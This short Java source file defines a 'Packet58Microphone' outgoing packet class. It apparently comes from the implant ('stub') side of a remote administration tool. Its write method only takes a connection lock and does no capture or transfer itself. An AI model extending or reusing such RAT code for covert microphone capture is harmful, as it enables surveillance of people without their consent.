package com.redpois0n.stub.packets.outgoing;

import java.io.DataOutputStream;

import com.redpois0n.Connection;
import com.redpois0n.common.io.StringWriter;

public class Packet58Microphone extends AbstractOutgoingPacket {

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		Connection.lock();
	}

	@Override
	public byte getPacketId() {
		return 58;
	}

}
